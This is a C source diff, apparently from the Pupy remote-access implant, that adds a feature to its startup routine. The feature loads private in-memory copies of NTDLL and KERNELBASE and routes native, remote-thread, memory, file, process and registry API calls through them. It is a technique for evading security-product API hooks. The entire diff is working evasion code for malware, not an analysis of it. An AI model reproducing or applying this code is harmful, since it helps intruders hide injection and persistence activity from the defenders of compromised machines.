@@ -159,7 +159,22 @@ LPSTR* CommandLineToArgvA(INT *pNumArgs)
     return result;
 }
 
+#ifdef _PUPY_PRIVATE_NT
+static const PSTR NtDllAllowedPrefixes[] = {"Nt", NULL};
+static const PSTR Kernel32AllowedPrefixes[] = {
+    "CreateRemote", "CreateFile", "Delete", "Open",
+    "Write", "Read", "Terminate", "Resume", "Virtual",
+    "Reg", NULL
+};
+#endif
+
 void initialize(BOOL isDll, on_exit_session_t *cb) {
+#ifdef _PUPY_PRIVATE_NT
+    HMODULE hNtDll;
+    HMODULE hKernelBase;
+    HMODULE hKernel32;
+#endif
+
     int i, argc = 0;
     char **argv = NULL;
 
@@ -168,6 +183,41 @@ void initialize(BOOL isDll, on_exit_session_t *cb) {
 #endif
 
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
+
+#ifdef _PUPY_PRIVATE_NT
+    hNtDll = GetModuleHandleA("NTDLL.DLL");
+    hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
+    hKernel32 = GetModuleHandleA("KERNEL32.DLL");
+
+    if (hNtDll && hKernel32 && hKernelBase)  {
+        HMODULE hPrivate;
+        dprint("Loading private copy of NTDLL/KERNELBASE\n");
+
+        hPrivate = MyLoadLibraryEx("NTDLL.DLL", hNtDll, NULL, TRUE);
+        if (hPrivate) {
+            dprint(
+                "Private copy of NTDLL.DLL loaded to %p (orig: %p)\n",
+                hPrivate, hNtDll
+            );
+
+            if (SetAliasedModule(hPrivate, NULL, NtDllAllowedPrefixes, NULL)) {
+                dprint("Allow Nt prefixes for private NTDLL");
+            }
+
+            hPrivate = MyLoadLibraryEx("KERNEL32.DLL", hKernelBase, NULL, TRUE);
+            if (hPrivate) {
+                dprint(
+                    "Private copy of KERNELBASE.DLL loaded to %p as KERNEL32 (orig: %p)\n",
+                    hPrivate, hKernel32
+                );
+
+                if (SetAliasedModule(hPrivate, hKernel32, Kernel32AllowedPrefixes, NULL)) {
+                    dprint("Set aliased module for KERNELBASE32.DLL to KERNEL32.DLL");
+                }
+            }
+        }
+    }
+#endif
 
 #ifdef DEBUG
     redirect_stdout();
